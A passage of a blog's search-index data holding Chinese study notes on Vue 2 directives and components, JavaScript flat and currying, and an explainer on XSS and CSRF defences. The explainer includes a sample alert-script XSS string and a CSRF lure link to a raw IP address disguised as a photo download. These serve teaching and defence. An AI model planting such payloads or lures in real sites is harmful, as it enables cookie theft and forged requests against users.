&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;!-- 具名插槽 --&amp;gt;&amp;lt;base-layout&amp;gt;  &amp;lt;template v-slot:header&amp;gt;    Header content  &amp;lt;/template&amp;gt;  Default slot content  &amp;lt;template v-slot:footer&amp;gt;    Footer content  &amp;lt;/template&amp;gt;&amp;lt;/base-layout&amp;gt;&amp;lt;!-- 接收 prop 的具名插槽 --&amp;gt;&amp;lt;infinite-scroll&amp;gt;  &amp;lt;template v-slot:item=&amp;quot;slotProps&amp;quot;&amp;gt;    &amp;lt;div class=&amp;quot;item&amp;quot;&amp;gt;      {{ slotProps.item.text }}    &amp;lt;/div&amp;gt;  &amp;lt;/template&amp;gt;&amp;lt;/infinite-scroll&amp;gt;&amp;lt;!-- 接收 prop 的默认插槽，使用了解构 --&amp;gt;&amp;lt;mouse-position v-slot=&amp;quot;{ x, y }&amp;quot;&amp;gt;  Mouse position: {{ x }}, {{ y }}&amp;lt;/mouse-position&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;v-pre&#34;&gt;&lt;strong&gt;v-pre&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;跳过这个节点和子节点的编译过程，可以用来显示原始的Mustache标签，跳过大量没有指令的节点会加快编译。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;span v-pre&amp;gt;{{ this will not be compiled }}&amp;lt;/span&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;v-cloak&#34;&gt;&lt;strong&gt;v-cloak&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;这个指令保持在元素上直到关联实例结束编译。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;当网络较慢，网页还在加载 Vue.js ，而导致 Vue 来不及渲染，这时页面就会显示出 Vue 源代码。我们可以使用 v-cloak 指令来解决这一问题&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;[v-cloak] {
  display: none;
}
&amp;lt;div v-cloak&amp;gt;
  {{ message }}
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;直到编译完成才会显示&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;v-once&#34;&gt;&lt;strong&gt;v-once&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;详细：&lt;/p&gt;
&lt;p&gt;只渲染元素和组件 &lt;strong&gt;一次&lt;/strong&gt;，随后的渲染，元素和子节点会被当做静态元素并跳过渲染。用于优化性能。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2 id=&#34;特殊attribute&#34;&gt;特殊attribute&lt;/h2&gt;
&lt;br&gt;
&lt;h3 id=&#34;key&#34;&gt;&lt;strong&gt;key&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;用于vue的虚拟DOM算法中，对于新旧树的差异，使用&lt;code&gt;key&lt;/code&gt;会尽量替代和交换位置，而不是直接修改。&lt;/p&gt;
&lt;p&gt;如下场景时它可能会很有用：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;完整地触发组件的生命周期钩子&lt;/li&gt;
&lt;li&gt;触发过渡&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;transition&amp;gt;
  &amp;lt;span :key=&amp;quot;text&amp;quot;&amp;gt;{{ text }}&amp;lt;/span&amp;gt;
&amp;lt;/transition&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当 &lt;code&gt;text&lt;/code&gt; 发生改变时，&lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt; 总是会被替换而不是被修改，因此会触发过渡。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;ref&#34;&gt;&lt;strong&gt;ref&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ref&lt;/code&gt;被用来给元素或者子组件注册引用信息。被注册的对象可以在父组件的&lt;code&gt;$refs&lt;/code&gt;对象上使用。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!-- `vm.$refs.p` will be the DOM node --&amp;gt;
&amp;lt;p ref=&amp;quot;p&amp;quot;&amp;gt;hello&amp;lt;/p&amp;gt;

&amp;lt;!-- `vm.$refs.child` will be the child component instance --&amp;gt;
&amp;lt;child-component ref=&amp;quot;child&amp;quot;&amp;gt;&amp;lt;/child-component&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;关于 ref 注册时间的重要说明：因为 ref 本身是作为渲染结果被创建的，在初始渲染的时候你不能访问它们 - 它们还不存在！&lt;code&gt;$refs&lt;/code&gt; 也不是响应式的，因此你不应该试图用它在模板中做数据绑定&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;is&#34;&gt;&lt;strong&gt;is&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;用于动态组件且基于DOM内模板的限制来工作。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;    &amp;lt;!-- 当 `currentView` 改变时，组件也跟着改变 --&amp;gt;    &amp;lt;component v-bind:is=&amp;quot;currentView&amp;quot;&amp;gt;&amp;lt;/component&amp;gt;    &amp;lt;!-- 这样做是有必要的，因为 `&amp;lt;my-row&amp;gt;` 放在一个 --&amp;gt;    &amp;lt;!-- `&amp;lt;table&amp;gt;` 内可能无效且被放置到外面 --&amp;gt;    &amp;lt;table&amp;gt;      &amp;lt;tr is=&amp;quot;my-row&amp;quot;&amp;gt;&amp;lt;/tr&amp;gt;	&amp;lt;/table&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2 id=&#34;内置的组件&#34;&gt;内置的组件&lt;/h2&gt;
&lt;br&gt;
&lt;h3 id=&#34;component&#34;&gt;&lt;strong&gt;component&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;渲染一个“元组件”为动态组件。依 &lt;code&gt;is&lt;/code&gt; 的值，来决定哪个组件被渲染。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!-- 动态组件由 vm 实例的 `componentId` property 控制 --&amp;gt;&amp;lt;component :is=&amp;quot;componentId&amp;quot;&amp;gt;&amp;lt;/component&amp;gt;&amp;lt;!-- 也能够渲染注册过的组件或 prop 传入的组件 --&amp;gt;&amp;lt;component :is=&amp;quot;$options.components.child&amp;quot;&amp;gt;&amp;lt;/component&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;keep-alive&#34;&gt;&lt;strong&gt;keep-alive&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;props:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;include&lt;/code&gt;  -字符或者正则表达式。只有匹配的组件会被缓存。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;exclude&lt;/code&gt;  -字符串或正则表达式。匹配的组件将&lt;strong&gt;不会被缓存&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;max&lt;/code&gt; -数字。最多可以缓存多少组件实例。一旦这个数字达到了，在新实例被创建之前，已缓存组件中最久没有被访问的实例会被销毁掉。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt; 	// 1. 将缓存 name 为 test 的组件  	&amp;lt;keep-alive include=&#39;test&#39;&amp;gt;      &amp;lt;router-view/&amp;gt;    &amp;lt;/keep-alive&amp;gt;	// 2. 将不缓存 name 为 test 的组件	&amp;lt;keep-alive exclude=&#39;test&#39;&amp;gt;  	  &amp;lt;router-view/&amp;gt;	&amp;lt;/keep-alive&amp;gt;	// 3. 使用正则表达式，需使用 v-bind	&amp;lt;keep-alive :include=&#39;/a|b/&#39;&amp;gt;  	  &amp;lt;router-view/&amp;gt;	&amp;lt;/keep-alive&amp;gt;	
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;keep-alive&amp;gt;&lt;/code&gt;包裹的动态组件时，会缓存不活动的组件实例，而不是销毁它们。&lt;/p&gt;
&lt;p&gt;当组件在&lt;code&gt;kepp-alive&lt;/code&gt;里面切换时，会触发&lt;code&gt;activated&lt;/code&gt;和&lt;code&gt;deactivated&lt;/code&gt;生命周期函数。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;transition&#34;&gt;&lt;strong&gt;transition&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;props:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;name&lt;/code&gt;：用于自动生成CSS过度类名。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;appear&lt;/code&gt;：是否在过度时使用渲染。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;css&lt;/code&gt;：是否使用CSS过度类。&lt;/p&gt;
&lt;img src=&#34;https://www.runoob.com/wp-content/uploads/2018/06/transition.png&#34;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;enter-class&lt;/code&gt; - string&lt;/li&gt;
&lt;li&gt;&lt;code&gt;leave-class&lt;/code&gt; - string&lt;/li&gt;
&lt;li&gt;&lt;code&gt;appear-class&lt;/code&gt; - string&lt;/li&gt;
&lt;li&gt;&lt;code&gt;enter-to-class&lt;/code&gt; - string&lt;/li&gt;
&lt;li&gt;&lt;code&gt;leave-to-class&lt;/code&gt; - string&lt;/li&gt;
&lt;li&gt;&lt;code&gt;appear-to-class&lt;/code&gt; - string&lt;/li&gt;
&lt;li&gt;&lt;code&gt;enter-active-class&lt;/code&gt; - string&lt;/li&gt;
&lt;li&gt;&lt;code&gt;leave-active-class&lt;/code&gt; - string&lt;/li&gt;
&lt;li&gt;&lt;code&gt;appear-active-class&lt;/code&gt; - string&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;type&lt;/code&gt;：指定过度事件类型，侦听过渡何时结束。有效值为 &lt;code&gt;&amp;quot;transition&amp;quot;&lt;/code&gt; 和 &lt;code&gt;&amp;quot;animation&amp;quot;&lt;/code&gt;。默认 Vue.js 将自动检测出持续时间长的为过渡事件类型。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mode&lt;/code&gt;：控制离开/进入过度的时间序列。有效的模式有&lt;code&gt;out-in&lt;/code&gt;和&lt;code&gt;in-out&lt;/code&gt;；默认同时进行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;duration&lt;/code&gt;：{ &lt;code&gt;enter&lt;/code&gt;: number, &lt;code&gt;leave&lt;/code&gt;: number } 指定过渡的持续时间。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;事件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;before-enter&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;before-leave&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;before-appear&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;enter&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;leave&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;appear&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;after-enter&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;after-leave&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;after-appear&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;enter-cancelled&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;leave-cancelled&lt;/code&gt; (&lt;code&gt;v-show&lt;/code&gt; only)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;appear-cancelled&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;transition&amp;gt;&lt;/code&gt; 元素作为&lt;strong&gt;单个&lt;/strong&gt;元素/组件的过渡效果&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;transition&amp;gt;&lt;/code&gt; 只会把过渡效果应用到其包裹的内容上，而不会额外渲染 DOM 元素，也不会出现在可被检查的组件层级中。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!-- 简单元素 --&amp;gt;
&amp;lt;transition&amp;gt;
  &amp;lt;div v-if=&amp;quot;ok&amp;quot;&amp;gt;toggled content&amp;lt;/div&amp;gt;
&amp;lt;/transition&amp;gt;

&amp;lt;!-- 动态组件 --&amp;gt;
&amp;lt;transition name=&amp;quot;fade&amp;quot; mode=&amp;quot;out-in&amp;quot; appear&amp;gt;
  &amp;lt;component :is=&amp;quot;view&amp;quot;&amp;gt;&amp;lt;/component&amp;gt;
&amp;lt;/transition&amp;gt;

&amp;lt;!-- 事件钩子 --&amp;gt;
&amp;lt;div id=&amp;quot;transition-demo&amp;quot;&amp;gt;
  &amp;lt;transition @after-enter=&amp;quot;transitionComplete&amp;quot;&amp;gt;
    &amp;lt;div v-show=&amp;quot;ok&amp;quot;&amp;gt;toggled content&amp;lt;/div&amp;gt;
  &amp;lt;/transition&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;new Vue({  ...  methods: {    transitionComplete: function (el) {      // 传入 &#39;el&#39; 这个 DOM 元素作为参数。    }  }  ...}).$mount(&#39;#transition-demo&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;transiton-group&#34;&gt;&lt;strong&gt;transiton-group&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;props&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;tag&lt;/code&gt; - string，默认为 &lt;code&gt;span&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;move-class&lt;/code&gt; - 覆盖移动过渡期间应用的 CSS 类。&lt;/li&gt;
&lt;li&gt;除了 &lt;code&gt;mode&lt;/code&gt;，其他 attribute 和 &lt;code&gt;&amp;lt;transition&amp;gt;&lt;/code&gt; 相同。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;事件&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;事件和 &lt;code&gt;&amp;lt;transition&amp;gt;&lt;/code&gt; 相同。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;用法&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;transition-group&amp;gt;&lt;/code&gt; 元素作为多个元素/组件的过渡效果。&lt;code&gt;&amp;lt;transition-group&amp;gt;&lt;/code&gt; 渲染一个真实的 DOM 元素。默认渲染 &lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt;，可以通过 &lt;code&gt;tag&lt;/code&gt; attribute 配置哪个元素应该被渲染。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;transition-group tag=&amp;quot;ul&amp;quot; name=&amp;quot;slide&amp;quot;&amp;gt;
  &amp;lt;li v-for=&amp;quot;item in items&amp;quot; :key=&amp;quot;item.id&amp;quot;&amp;gt;
    {{ item.text }}
  &amp;lt;/li&amp;gt;
&amp;lt;/transition-group&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;br&gt;
">VUE 2.x  全局API</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/js-shi-xian-flathan-shu-ke-li-hua/"" data-c="
          &lt;h2 id=&#34;flat&#34;&gt;flat&lt;/h2&gt;
&lt;p&gt;flat函数是用于数组扁平化，传入参数为扁平化层数。&lt;/p&gt;
&lt;p&gt;该方法返回一个新数组，对原数据没有影响&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flat()&lt;/code&gt;默认只会“拉平”一层&lt;/p&gt;
&lt;p&gt;如果原数组有空位，&lt;code&gt;flat()&lt;/code&gt;方法会跳过空位。&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;reduce&lt;/code&gt;来实现&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;arr.reduce(callback,[initialValue])
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;callback&lt;/code&gt;J可以接收四个参数。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;initialValue&lt;/code&gt;为赋予初始值。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function myflat(arr){

    return arr.reduce((prev,cur)=&amp;gt;{
      return prev.concat(Array.isArray(cur)?myflat(cur):cur)
   },[])
}

console.log(myflat([1,[2,[3]]])); //[1,2,3]
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;柯里化&#34;&gt;柯里化&lt;/h2&gt;
&lt;p&gt;实现多个参数时候递归传参&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//函数柯里化
function sumFn(a,b,c){return a+ b + c};
let sum = curry(sumFn);
console.log(sum(2)(3)(5));//10
console.log(sum(2,3)(5));//10


function curry(fn,...arg){
    let fnlen=fn.length
    let args=arg.length

    if(fnlen&amp;gt;args){
        //当还有参数时候 进行递归传参
        return function(...arg2){
            return curry(fn,...arg,...arg2)
        }
    }else{
        //当全部传完的时候执行该函数
       return fn(...arg)
    }
}
&lt;/code&gt;&lt;/pre&gt;
">JS实现flat、函数柯里化</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/kua-zhan-jiao-ben-gong-ji-xsswei-shi-me-cookie-zhong-you-httponly-shu-xing/"" data-c="
          &lt;h2 id=&#34;什么是xss&#34;&gt;什么是XSS&lt;/h2&gt;
&lt;p&gt;XSS全称是Cross Site Scripting，为了与“CSS”区分开来，故简称XSS，翻译过来就是“跨站脚本”。&lt;/p&gt;
&lt;p&gt;XSS 攻击是指⿊客往HTML⽂件中或者DOM中注⼊恶意脚本，从⽽在⽤⼾浏览⻚⾯时利⽤注⼊的恶意脚本对⽤⼾ 实施攻击的⼀种⼿段。&lt;/p&gt;
&lt;p&gt;恶意脚本做哪些事情&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可以&lt;strong&gt;窃取Cookie信息&lt;/strong&gt;。恶意JavaScript可以通过“document.cookie”获取Cookie信息，然后通过 XMLHttpRequest或者Fetch加上CORS功能将数据发送给恶意服务器；恶意服务器拿到⽤⼾的Cookie信息 之后，就可以在其他电脑上模拟⽤⼾的登录，然后进⾏转账等操作。&lt;/li&gt;
&lt;li&gt;可以&lt;strong&gt;监听用户行为&lt;/strong&gt;，通过&lt;code&gt;addEventListener&lt;/code&gt;接口来监听键盘等事件。&lt;/li&gt;
&lt;li&gt;可以通过&lt;strong&gt;修改DOM&lt;/strong&gt;伪造假的登录窗口，来欺骗用户输入从而获取信息&lt;/li&gt;
&lt;li&gt;还有&lt;strong&gt;浮窗广告&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;恶意脚本如何注入&#34;&gt;恶意脚本如何注入&lt;/h2&gt;
&lt;p&gt;常见的主要有&lt;strong&gt;存储型XSS攻击、反射型XSS攻击和基于DOM的XSS攻击&lt;/strong&gt;三种⽅式来注⼊恶意脚本&lt;/p&gt;
&lt;h3 id=&#34;存储型xss攻击&#34;&gt;存储型XSS攻击&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;C:%5CUsers%5C16239%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210908141204562.png&#34; alt=&#34;image-20210908141204562&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;主要是能提交内容的部分没有对内容进行过滤，导致JS代码被带进数据库&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;反射型xss攻击&#34;&gt;反射型XSS攻击&lt;/h3&gt;
&lt;p&gt;在⼀个反射型XSS攻击过程中，恶意JavaScript脚本属于⽤⼾发送给⽹站请求中的⼀部分，随后⽹站⼜把恶 意JavaScript脚本返回给⽤⼾。当恶意JavaScript脚本在⽤⼾⻚⾯中被执⾏时，⿊客就可以利⽤该脚本做⼀ 些恶意操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Web服务器不会存储反射型XSS攻击的恶意脚本，这是和存储型XSS攻击不同的地⽅。&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;基于dom的xss攻击&#34;&gt;基于DOM的XSS攻击&lt;/h3&gt;
&lt;p&gt;基于DOM的XSS攻击是不牵涉到⻚⾯Web服务器的。&lt;/p&gt;
&lt;p&gt;⿊客通过各种⼿段将恶意脚本注⼊⽤⼾的⻚ ⾯中，⽐如通过⽹络劫持在⻚⾯传输过程中修改HTML⻚⾯的内容，这种劫持类型很多，有通过WiFi路由器 劫持的，有通过本地恶意软件来劫持的，它们的共同点是在Web资源传输过程或者在⽤⼾使⽤⻚⾯的过程中 修改Web⻚⾯的数据。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;如何阻止xss攻击&#34;&gt;如何阻止XSS攻击&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;存储型XSS攻击&lt;/strong&gt;和&lt;strong&gt;反射型XSS&lt;/strong&gt;攻击都是需要经过Web服务器来处理的，因此可以认为&lt;strong&gt;这两种类型的漏洞是服务端的安全漏洞&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;⽽基于DOM的XSS攻击全部都是在浏览器端完成的，因此&lt;strong&gt;基于DOM的XSS攻击&lt;/strong&gt;是 属于前端的安全漏洞。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;服务器对输入内容进行过滤或者转码&#34;&gt;服务器对输入内容进行过滤或者转码&lt;/h3&gt;
&lt;p&gt;把&lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;你被xss攻击了&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;进行过滤或者转码，使其失去功能，类似&lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;你被xss攻击了&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;充分利用csp&#34;&gt;充分利用CSP&lt;/h3&gt;
&lt;p&gt;CSP的功能&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;限制加载其他域下的资源⽂件，这样即使⿊客插⼊了⼀个JavaScript⽂件，这个JavaScript⽂件也是⽆法被加载的；&lt;/li&gt;
&lt;li&gt;禁⽌向第三⽅域提交数据，这样⽤⼾数据也不会外泄；&lt;/li&gt;
&lt;li&gt;禁⽌执⾏内联脚本和未授权的脚本；&lt;/li&gt;
&lt;li&gt;提供了上报机制，这样可以帮助我们尽快发现有哪些XSS攻击，以便尽快修复问题。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;使用httponly属性&#34;&gt;使⽤HttpOnly属性&lt;/h3&gt;
&lt;p&gt;由于很多XSS攻击都是来盗⽤cookie的，因此还可以通过使⽤HttpOnly属性来保护我们Cookie的安全。&lt;/p&gt;
&lt;p&gt;通常服务器可以将某些cookie设置为HttpOnly标志&lt;/p&gt;
&lt;p&gt;被设置为HttpOnly的cookie只能使用在HTTP请求中，无法被JS读取。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;什么是csrf攻击&#34;&gt;什么是CSRF攻击&lt;/h2&gt;
&lt;p&gt;CSRF英⽂全称是Cross-site request forgery，所以⼜称为“跨站请求伪造”&lt;/p&gt;
&lt;p&gt;CSRF攻击就是⿊客利⽤了⽤ ⼾的登录状态，并通过第三⽅的站点来做⼀些坏事。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;和XSS不同的是，CSRF攻击不需要将恶意代码注⼊⽤⼾的⻚ ⾯，仅仅是利⽤服务器的漏洞和⽤⼾的登录状态来实施攻击。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;类似链接点击这种&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;div&amp;gt;
    &amp;lt;img width=150 src=http://images.xuejuzi.cn/1612/1_161230185104_1.jpg&amp;gt; &amp;lt;/img&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div&amp;gt;
    &amp;lt;a href=&amp;quot;http://139.196.87.221/getallcarjoin?isdone=0&amp;quot; taget=&amp;quot;_blank&amp;quot;&amp;gt;
    点击下载美⼥照⽚
    &amp;lt;/a&amp;gt;
&amp;lt;/div&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;如何阻止csrf攻击&#34;&gt;如何阻止CSRF攻击&lt;/h2&gt;
&lt;p&gt;发起CSRF攻击的三个必要条件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;目标站点有CSRF的漏洞&lt;/li&gt;
&lt;li&gt;⽤⼾要登录过⽬标站点，并且在浏览器上保持有该站点的登录状态；&lt;/li&gt;
&lt;li&gt;需要⽤⼾打开⼀个第三⽅站点，可以是⿊客的站点，也可以是⼀些论坛。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对于CSRF攻击主要的防护⼿段是提升服务器的安全性&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;充分利用好cookie-的-samesite-属性&#34;&gt;充分利⽤好Cookie 的 SameSite 属性&lt;/h3&gt;
&lt;p&gt;⿊客会利⽤⽤⼾的登录状态来发起CSRF攻击，⽽Cookie正是浏览器和 服务器之间维护登录状态的⼀个关键数据，因此要阻⽌CSRF攻击，⾸先就要考虑在Cookie上来做⽂章。&lt;/p&gt;
&lt;p&gt;通常CSRF攻击都是从第三⽅站点发起的，要防⽌CSRF攻击，我们最好能实现从第三⽅站点发送请求时禁⽌ Cookie的发送，因此在浏览器通过不同来源发送HTTP请求时，有如下区别：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果是从第三⽅站点发起的请求，那么需要浏览器禁⽌发送某些关键Cookie数据到服务器；&lt;/li&gt;
&lt;li&gt;如果是同⼀个站点发起的请求，那么就需要保证Cookie数据正常发送。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Cookie 中的SameSite属性可以有效地降低 CSRF攻击的⻛险&lt;/p&gt;
&lt;p&gt;在HTTP响应头中，通过set-cookie字段设置Cookie时，可以带上SameSite选项&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;set-cookie: 1P_JAR=2019-10-20-06; expires=Tue, 19-Nov-2019 06:36:21 GMT; path=/; domain=.google.com; SameSite=none
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;SameSite选项通常有Strict、Lax和None三个值。&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果SameSite的值是Strict，那么浏览器会完全禁⽌第三⽅ Cookie。&lt;/li&gt;
&lt;li&gt;Lax相对宽松⼀点。从第三⽅站点的链接打开和从第三⽅站点提交Get⽅式的表单这 两种⽅式都会携带Cookie。但如果在第三⽅站点中使⽤Post⽅法，或者通过img、iframe等标签加载的 URL，这些场景都不会携带Cookie。&lt;/li&gt;
&lt;li&gt;⽽如果使⽤None的话，在任何情况下都会发送Cookie数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;验证请求的来源站点&#34;&gt;验证请求的来源站点&lt;/h3&gt;
&lt;p&gt;另外⼀种防⽌CSRF攻击的策略，那就是在服务器端验证请求来源的站点。&lt;/p&gt;
